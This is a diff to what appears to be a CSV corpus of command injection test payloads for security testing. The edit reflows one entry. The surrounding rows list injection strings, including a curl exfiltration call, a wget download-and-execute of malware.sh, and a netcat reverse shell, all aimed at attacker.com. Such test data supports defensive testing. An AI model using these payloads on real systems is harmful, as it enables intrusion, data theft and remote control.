@@ -376,8 +376,7 @@ cmdinj-004,cmdi,id,Command Injection,high,Inject id command using backticks,Comm
 cmdinj-005,cmdi,$(uname -a),Command Injection,high,Inject uname command,Command injection with $() syntax,
 cmdinj-006,cmdi,$(echo $(whoami)),Command Injection,high,Nested command substitution,Command injection with nested $(),
 cmdinj-007,cmdi,& sleep 10,Command Injection,medium,Inject sleep command for timing attack,Command injection with ampersand and sleep,
-cmdinj-008,cmdi,"&& echo 'injected'
-",Command Injection,high,Inject command with newline,Command injection with newline character,
+cmdinj-008,cmdi,&& echo 'injected',Command Injection,high,Inject command with newline,Command injection with newline character,
 cmdinj-009,cmdi,; curl http://attacker.com,Command Injection,critical,Exfiltrate data via curl,Command injection with semicolon and curl,
 cmdinj-010,cmdi,; wget http://attacker.com/malware.sh -O /tmp/m.sh; sh /tmp/m.sh,Command Injection,critical,Download and execute malware,Command injection with semicolon and wget,
 cmdinj-011,cmdi,| nc attacker.com 4444 -e /bin/sh,Command Injection,critical,Reverse shell via netcat,Command injection with pipe and netcat reverse shell,
